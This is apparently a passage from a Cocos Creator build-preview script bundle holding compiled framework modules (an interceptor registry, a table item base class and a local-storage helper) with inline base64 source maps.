//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaHR0cC9IdHRwUHJvdG9jb2wudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBRW5HO0lBQUE7UUFDSSxRQUFHLEdBQVUsSUFBSSxDQUFDO1FBQ2xCLFlBQU8sR0FBVSxFQUFFLENBQUM7UUFDcEIsYUFBUSxHQUFVLElBQUksQ0FBQztJQWdEM0IsQ0FBQztJQTlDRyx3Q0FBaUIsR0FBakI7UUFDSSxPQUFPLElBQUksQ0FBQyxRQUFRLENBQUMsTUFBTSxDQUFDO0lBQ2hDLENBQUM7SUFFRCxzQ0FBZSxHQUFmO1FBQ0ksT0FBTyxJQUFJLENBQUMsUUFBUSxDQUFDLElBQUksQ0FBQztJQUM5QixDQUFDO0lBRUQseUNBQWtCLEdBQWxCO1FBQ0ksT0FBTyxJQUFJLENBQUMsUUFBUSxDQUFDLE9BQU8sQ0FBQztJQUNqQyxDQUFDO0lBRUQsNkJBQU0sR0FBTjtRQUNJLE9BQU8sQ0FBQyxHQUFHLENBQUMsZUFBZSxHQUFDLElBQUksQ0FBQyxHQUFHLEVBQUUsSUFBSSxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQ3BELElBQUksTUFBTSxHQUFHLElBQUksQ0FBQztRQUNsQixJQUFHLE9BQU8sUUFBUSxJQUFJLFVBQVUsRUFBRTtZQUM5QixJQUFJLElBQUksR0FBRyxJQUFJLFFBQVEsRUFBRSxDQUFDO1lBQzFCLEtBQUksSUFBSSxJQUFJLElBQUksSUFBSSxDQUFDLE9BQU8sRUFBRTtnQkFDMUIsSUFBSSxPQUFPLElBQUksQ0FBQyxPQUFPLENBQUMsSUFBSSxDQUFDLElBQUksVUFBVSxFQUFDO29CQUN4QyxJQUFJLENBQUMsTUFBTSxDQUFDLElBQUksRUFBQyxJQUFJLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUM7aUJBQ3hDO2FBQ0o7WUFDRCxNQUFNLEdBQUcsSUFBSSxDQUFDO1NBQ2pCO2FBQUs7WUFDRixxQkFBcUI7WUFDckIsSUFBSSxHQUFHLEdBQUcsRUFBRSxDQUFDO1lBQ2IsSUFBSSxDQUFDLEdBQUcsQ0FBQyxDQUFDO1lBQ1YsS0FBSSxJQUFJLElBQUksSUFBSSxJQUFJLENBQUMsT0FBTyxFQUFFO2dCQUMxQixJQUFJLE9BQU8sSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJLENBQUMsSUFBSSxVQUFVLEVBQUM7b0JBQ3hDLEdBQUcsQ0FBQyxDQUFDLENBQUMsR0FBRyxrQkFBa0IsQ0FBQyxJQUFJLENBQUMsR0FBRyxHQUFHLEdBQUcsa0JBQWtCLENBQUMsSUFBSSxDQUFDLE9BQU8sQ0FBQyxJQUFJLENBQUMsQ0FBQyxDQUFDO29CQUNqRixDQUFDLEVBQUUsQ0FBQztpQkFDUDthQUNKO1lBQ0QsTUFBTSxHQUFHLEdBQUcsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLENBQUM7U0FDMUI7UUFFRCxPQUFPLE1BQU0sQ0FBQztJQUNsQixDQUFDO0lBRUQsNkJBQU0sR0FBTixVQUFPLElBQVE7UUFDWCxJQUFJLENBQUMsUUFBUSxHQUFHLElBQUksQ0FBQyxLQUFLLENBQUMsSUFBSSxDQUFDLENBQUM7UUFDakMsT0FBTyxDQUFDLEdBQUcsQ0FBQyxlQUFlLEdBQUMsSUFBSSxDQUFDLEdBQUcsRUFBRSxJQUFJLENBQUMsQ0FBQztRQUM1QyxJQUFJLElBQUksQ0FBQyxRQUFRLENBQUMsTUFBTSxJQUFJLENBQUMsRUFBQztZQUMxQixNQUFNLElBQUksQ0FBQyxRQUFRLENBQUM7U0FDdkI7SUFDTCxDQUFDO0lBQ0wsbUJBQUM7QUFBRCxDQW5EQSxBQW1EQyxJQUFBIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBIdHRwUHJvdG9jb2wge1xyXG4gICAgdXJpOnN0cmluZyA9IG51bGw7XHJcbiAgICByZXF1ZXN0Om9iamVjdCA9IHt9O1xyXG4gICAgcmVzcG9uc2U6b2JqZWN0ID0gbnVsbDtcclxuXHJcbiAgICBnZXRSZXNwb25zZVN0YXR1cygpOm51bWJlcntcclxuICAgICAgICByZXR1cm4gdGhpcy5yZXNwb25zZS5zdGF0dXM7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0UmVzcG9uc2VEYXRhPFQ+KCk6VHtcclxuICAgICAgICByZXR1cm4gdGhpcy5yZXNwb25zZS5kYXRhO1xyXG4gICAgfVxyXG5cclxuICAgIGdldFJlc3BvbnNlTWVzc2FnZSgpOnN0cmluZ3tcclxuICAgICAgICByZXR1cm4gdGhpcy5yZXNwb25zZS5tZXNzYWdlO1xyXG4gICAgfVxyXG5cclxuICAgIGVuY29kZSgpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwiPj4+PuWPkeWPkeWPkeWPkeWPkeWPkT09PVwiK3RoaXMudXJpLCB0aGlzLnJlcXVlc3QpO1xyXG4gICAgICAgIGxldCByZXN1bHQgPSBudWxsO1xyXG4gICAgICAgIGlmKHR5cGVvZiBGb3JtRGF0YSA9PSBcImZ1bmN0aW9uXCIpIHtcclxuICAgICAgICAgICAgbGV0IGRhdGEgPSBuZXcgRm9ybURhdGEoKTtcclxuICAgICAgICAgICAgZm9yKGxldCBhdHRyIGluIHRoaXMucmVxdWVzdCkge1xyXG4gICAgICAgICAgICAgICAgaWYgKHR5cGVvZiB0aGlzLnJlcXVlc3RbYXR0cl0gIT0gXCJmdW5jdGlvblwiKXtcclxuICAgICAgICAgICAgICAgICAgICBkYXRhLmFwcGVuZChhdHRyLHRoaXMucmVxdWVzdFthdHRyXSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgcmVzdWx0ID0gZGF0YTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIC8vIOS4jeaUr+aMgUZvcm1EYXRh55qE5rWP6KeI5Zmo55qE5aSE55CGXHJcbiAgICAgICAgICAgIGxldCBhcnIgPSBbXTtcclxuICAgICAgICAgICAgbGV0IGkgPSAwO1xyXG4gICAgICAgICAgICBmb3IobGV0IGF0dHIgaW4gdGhpcy5yZXF1ZXN0KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIHRoaXMucmVxdWVzdFthdHRyXSAhPSBcImZ1bmN0aW9uXCIpe1xyXG4gICAgICAgICAgICAgICAgICAgIGFycltpXSA9IGVuY29kZVVSSUNvbXBvbmVudChhdHRyKSArIFwiPVwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHRoaXMucmVxdWVzdFthdHRyXSk7XHJcbiAgICAgICAgICAgICAgICAgICAgaSsrO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHJlc3VsdCA9IGFyci5qb2luKFwiJlwiKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHJldHVybiByZXN1bHQ7XHJcbiAgICB9XHJcblxyXG4gICAgZGVjb2RlKGRhdGE6YW55KXtcclxuICAgICAgICB0aGlzLnJlc3BvbnNlID0gSlNPTi5wYXJzZShkYXRhKTtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIjw8PDzmlLbmlLbmlLbmlLbmlLbmlLY9PT1cIit0aGlzLnVyaSwgZGF0YSk7XHJcbiAgICAgICAgaWYgKHRoaXMucmVzcG9uc2Uuc3RhdHVzICE9IDApe1xyXG4gICAgICAgICAgICB0aHJvdyB0aGlzLnJlc3BvbnNlO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/interceptor/Interceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'e5d01V2r2VHM5KPSwqwyJKc', 'Interceptor');
// framework/interceptor/Interceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
exports.Interceptor = void 0;
var map = new Map();
var Interceptor = /** @class */ (function () {
    function Interceptor() {
    }
    Interceptor.register = function (command, interceptor) {
        var constructor = null;
        if (typeof interceptor == "function") {
            constructor = interceptor;
        }
        else {
            constructor = interceptor.constructor;
        }
        var arr = this.interceptorsOf(command);
        if (arr.every(function (value) { return value.constructor != constructor; })) {
            if (typeof interceptor == "function") {
                arr.push(new interceptor());
            }
            else {
                arr.push(interceptor);
            }
        }
    };
    Interceptor.unregister = function (command, interceptor) {
        var arr = this.interceptorsOf(command);
        var constructor = null;
        if (typeof interceptor == "function") {
            constructor = interceptor;
        }
        else {
            constructor = interceptor.constructor;
        }
        var newArr = arr.filter(function (value) { return value.constructor != constructor; });
        map.set(command, newArr);
    };
    Interceptor.interceptorsOf = function (command) {
        var arr = map.get(command);
        if (typeof arr == "undefined") {
            arr = [];
            map.set(command, arr);
        }
        return arr;
    };
    return Interceptor;
}());
exports.Interceptor = Interceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvaW50ZXJjZXB0b3IvSW50ZXJjZXB0b3IudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7OztBQU9uRyxJQUFJLEdBQUcsR0FBRyxJQUFJLEdBQUcsRUFBc0MsQ0FBQztBQUV4RDtJQUFBO0lBMkNBLENBQUM7SUF2Q1Usb0JBQVEsR0FBZixVQUFnQixPQUFjLEVBQUUsV0FBZ0M7UUFDNUQsSUFBSSxXQUFXLEdBQUcsSUFBSSxDQUFDO1FBQ3ZCLElBQUksT0FBTyxXQUFXLElBQUksVUFBVSxFQUFDO1lBQ2pDLFdBQVcsR0FBRyxXQUFXLENBQUE7U0FDNUI7YUFBSTtZQUNELFdBQVcsR0FBRyxXQUFXLENBQUMsV0FBVyxDQUFDO1NBQ3pDO1FBQ0QsSUFBSSxHQUFHLEdBQUcsSUFBSSxDQUFDLGNBQWMsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUN2QyxJQUFJLEdBQUcsQ0FBQyxLQUFLLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsV0FBVyxJQUFJLFdBQVcsRUFBaEMsQ0FBZ0MsQ0FBQyxFQUFDO1lBQ3JELElBQUksT0FBTyxXQUFXLElBQUksVUFBVSxFQUFDO2dCQUNqQyxHQUFHLENBQUMsSUFBSSxDQUFDLElBQUksV0FBVyxFQUFFLENBQUMsQ0FBQzthQUMvQjtpQkFBSztnQkFDRixHQUFHLENBQUMsSUFBSSxDQUFDLFdBQVcsQ0FBQyxDQUFDO2FBQ3pCO1NBQ0o7SUFDTCxDQUFDO0lBSU0sc0JBQVUsR0FBakIsVUFBa0IsT0FBYyxFQUFFLFdBQStCO1FBQzdELElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxjQUFjLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDdkMsSUFBSSxXQUFXLEdBQUcsSUFBSSxDQUFDO1FBQ3ZCLElBQUksT0FBTyxXQUFXLElBQUksVUFBVSxFQUFDO1lBQ2pDLFdBQVcsR0FBRyxXQUFXLENBQUE7U0FDNUI7YUFBSTtZQUNELFdBQVcsR0FBRyxXQUFXLENBQUMsV0FBVyxDQUFDO1NBQ3pDO1FBQ0QsSUFBSSxNQUFNLEdBQUcsR0FBRyxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxXQUFXLElBQUksV0FBVyxFQUFoQyxDQUFnQyxDQUFDLENBQUM7UUFDbkUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxPQUFPLEVBQUUsTUFBTSxDQUFDLENBQUM7SUFDN0IsQ0FBQztJQUVNLDBCQUFjLEdBQXJCLFVBQXNCLE9BQWM7UUFDaEMsSUFBSSxHQUFHLEdBQUcsR0FBRyxDQUFDLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUMzQixJQUFJLE9BQU8sR0FBRyxJQUFJLFdBQVcsRUFBQztZQUMxQixHQUFHLEdBQUcsRUFBRSxDQUFDO1lBQ1QsR0FBRyxDQUFDLEdBQUcsQ0FBQyxPQUFPLEVBQUUsR0FBRyxDQUFDLENBQUM7U0FDekI7UUFDRCxPQUFPLEdBQUcsQ0FBQztJQUNmLENBQUM7SUFDTCxrQkFBQztBQUFELENBM0NBLEFBMkNDLElBQUE7QUEzQ1ksa0NBQVciLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG4vLy8gPHJlZmVyZW5jZSBwYXRoPVwiQ29tbWFuZEludGVyY2VwdG9yLnRzXCIgLz5cclxuXHJcbmltcG9ydCB7SUNvbW1hbmRJbnRlcmNlcHRvcn0gZnJvbSBcIi4vQ29tbWFuZEludGVyY2VwdG9yXCI7XHJcblxyXG5sZXQgbWFwID0gbmV3IE1hcDxzdHJpbmcsIEFycmF5PElDb21tYW5kSW50ZXJjZXB0b3I+PigpO1xyXG5cclxuZXhwb3J0IGNsYXNzIEludGVyY2VwdG9ye1xyXG5cclxuICAgIHN0YXRpYyByZWdpc3RlcjxUIGV4dGVuZHMgSUNvbW1hbmRJbnRlcmNlcHRvcj4oY29tbWFuZDpzdHJpbmcsIGludGVyY2VwdG9yOiB7cHJvdG90eXBlOiBUfSk7XHJcblxyXG4gICAgc3RhdGljIHJlZ2lzdGVyKGNvbW1hbmQ6c3RyaW5nLCBpbnRlcmNlcHRvcjogSUNvbW1hbmRJbnRlcmNlcHRvcil7XHJcbiAgICAgICAgbGV0IGNvbnN0cnVjdG9yID0gbnVsbDtcclxuICAgICAgICBpZiAodHlwZW9mIGludGVyY2VwdG9yID09IFwiZnVuY3Rpb25cIil7XHJcbiAgICAgICAgICAgIGNvbnN0cnVjdG9yID0gaW50ZXJjZXB0b3JcclxuICAgICAgICB9ZWxzZXtcclxuICAgICAgICAgICAgY29uc3RydWN0b3IgPSBpbnRlcmNlcHRvci5jb25zdHJ1Y3RvcjtcclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IGFyciA9IHRoaXMuaW50ZXJjZXB0b3JzT2YoY29tbWFuZCk7XHJcbiAgICAgICAgaWYgKGFyci5ldmVyeSh2YWx1ZSA9PiB2YWx1ZS5jb25zdHJ1Y3RvciAhPSBjb25zdHJ1Y3Rvcikpe1xyXG4gICAgICAgICAgICBpZiAodHlwZW9mIGludGVyY2VwdG9yID09IFwiZnVuY3Rpb25cIil7XHJcbiAgICAgICAgICAgICAgICBhcnIucHVzaChuZXcgaW50ZXJjZXB0b3IoKSk7XHJcbiAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgIGFyci5wdXNoKGludGVyY2VwdG9yKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgdW5yZWdpc3RlcjxUIGV4dGVuZHMgSUNvbW1hbmRJbnRlcmNlcHRvcj4oY29tbWFuZDpzdHJpbmcsIGludGVyY2VwdG9yOiB7cHJvdG90eXBlOiBUfSk7XHJcblxyXG4gICAgc3RhdGljIHVucmVnaXN0ZXIoY29tbWFuZDpzdHJpbmcsIGludGVyY2VwdG9yOklDb21tYW5kSW50ZXJjZXB0b3Ipe1xyXG4gICAgICAgIGxldCBhcnIgPSB0aGlzLmludGVyY2VwdG9yc09mKGNvbW1hbmQpO1xyXG4gICAgICAgIGxldCBjb25zdHJ1Y3RvciA9IG51bGw7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBpbnRlcmNlcHRvciA9PSBcImZ1bmN0aW9uXCIpe1xyXG4gICAgICAgICAgICBjb25zdHJ1Y3RvciA9IGludGVyY2VwdG9yXHJcbiAgICAgICAgfWVsc2V7XHJcbiAgICAgICAgICAgIGNvbnN0cnVjdG9yID0gaW50ZXJjZXB0b3IuY29uc3RydWN0b3I7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGxldCBuZXdBcnIgPSBhcnIuZmlsdGVyKHZhbHVlID0+IHZhbHVlLmNvbnN0cnVjdG9yICE9IGNvbnN0cnVjdG9yKTtcclxuICAgICAgICBtYXAuc2V0KGNvbW1hbmQsIG5ld0Fycik7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGludGVyY2VwdG9yc09mKGNvbW1hbmQ6c3RyaW5nKTpbSUNvbW1hbmRJbnRlcmNlcHRvcl17XHJcbiAgICAgICAgbGV0IGFyciA9IG1hcC5nZXQoY29tbWFuZCk7XHJcbiAgICAgICAgaWYgKHR5cGVvZiBhcnIgPT0gXCJ1bmRlZmluZWRcIil7XHJcbiAgICAgICAgICAgIGFyciA9IFtdO1xyXG4gICAgICAgICAgICBtYXAuc2V0KGNvbW1hbmQsIGFycik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHJldHVybiBhcnI7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/type/KVData.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '446d6qbT8lCkZgFb1DEDrEV', 'KVData');
// framework/type/KVData.ts



cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvdHlwZS9LVkRhdGEudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbnRlcmZhY2UgS1ZEYXRhPFY+IHtcclxuICAgIFtrZXk6c3RyaW5nXTpWO1xyXG59Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/tableview/AbstractTableItem.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '16abfgZS1NEObZPGNwjtE5a', 'AbstractTableItem');
// framework/tableview/AbstractTableItem.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var AbstractTableItem = /** @class */ (function (_super) {
    __extends(AbstractTableItem, _super);
    function AbstractTableItem() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    AbstractTableItem = __decorate([
        ccclass
    ], AbstractTableItem);
    return AbstractTableItem;
}(cc.Component));
exports.default = AbstractTableItem;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvdGFibGV2aWV3L0Fic3RyYWN0VGFibGVJdGVtLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUF3RCxxQ0FBWTtJQUFwRTs7SUFHQSxDQUFDO0lBSDZCLGlCQUFpQjtRQUQ5QyxPQUFPO09BQ3NCLGlCQUFpQixDQUc5QztJQUFELHdCQUFDO0NBSEQsQUFHQyxDQUh1RCxFQUFFLENBQUMsU0FBUyxHQUduRTtrQkFINkIsaUJBQWlCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgYWJzdHJhY3QgY2xhc3MgQWJzdHJhY3RUYWJsZUl0ZW0gZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIGFic3RyYWN0IHVwYWR0ZUl0ZW0oZGF0YTphbnksIGluZGV4Om51bWJlcik7XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/persistence/LocalStorage.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '0eb5f782MZHjINkdZwIcuag', 'LocalStorage');
// framework/persistence/LocalStorage.ts

Object.defineProperty(exports, "__esModule", { value: true });
exports.LocalStorage = void 0;
var LocalStorage = /** @class */ (function () {
    function LocalStorage() {
    }
    LocalStorage.get = function (key) {
        return cc.sys.localStorage.getItem(this.prefix + key);
    };
    LocalStorage.set = function (key, value) {
        cc.sys.localStorage.setItem(this.prefix + key, value);
    };
    LocalStorage.getNumber = function (key) {
        var val = this.get(key);
        if (val == null) {
            return null;
        }
        return parseInt(val);
    };
    LocalStorage.setNumber = function (key, value) {
        this.set(key, value);
    };
    LocalStorage.getBoolean = function (key) {
        var val = this.getNumber(key);
        return !!val;
    };
    LocalStorage.setBoolean = function (key, b) {
        var value = 0;
        if (b) {
            value = 1;
        }
        this.set(key, value);
    };
    LocalStorage.getString = function (key) {
        return this.get(key);
    };
    LocalStorage.setString = function (key, value) {
        this.set(key, value);
    };
    LocalStorage.getObject = function (key, obj) {
        var val = this.get(key);
        if (val) {
            obj.decode(JSON.parse(val));
            return obj;
        }
        return null;
    };
    LocalStorage.setObject = function (key, obj) {
        var value = obj.encode();
        if (typeof value == "object") {
            value = JSON.stringify(value);
        }
        this.set(key, value);
    };
    LocalStorage.prefix = "";
    return LocalStorage;
}());
exports.LocalStorage = LocalStorage;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
